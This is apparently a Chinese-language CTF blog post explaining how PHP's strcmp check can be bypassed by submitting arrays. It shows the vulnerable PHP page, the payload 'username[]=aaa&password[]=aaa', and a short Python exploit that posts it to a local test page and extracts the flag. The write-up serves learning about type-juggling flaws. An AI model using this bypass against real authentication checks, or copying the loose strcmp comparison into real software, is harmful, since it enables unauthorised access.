---
layout: post
title: "[PHP] Strcmp函數繞過"
date: 2016-11-21 22:18:02 +0800
categories: [security, php]
tags: [security, php]
---


```php
<?php
include('flag.php');

$username = isset($_GET['username']) ? $_GET['username'] : '';
$password = isset($_GET['password']) ? $_GET['password'] : '';

if( strcmp($username,$flag) == 0 && strcmp($password,$flag) == 0 )
{
	echo $flag;
}
else
{
	echo 'try again';
}

show_source(__FILE__);
?>
```

漏洞出現於

```php
if( strcmp($username, $flag) == 0 && strcmp($password, $flag) == 0 )
```


PHP Strcmp函數 可利用輸入陣列繞過檢查


附上 payload
<pre>payload  = username[]=aaa&amp;password[]=aaa</pre>

成功後頁面
![成功後頁面](https://raw.githubusercontent.com/dyeat/dyeat.github.io/master/static/img/2016-11-21/1.png)


附上Exploit

```py
#coding=utf-8
import requests
import re
host = 'http://127.0.0.1/ctf/strcmp.php'
port = 80

payload = 'username[]=aaa&password[]=aaa'
req = requests.post(host,params=payload)
dump = req.text
pat = re.compile(r'c+.*}')  # + 代表開頭 *代表結尾
flag  = re.findall(pat, str(dump))
print (flag[0])
```
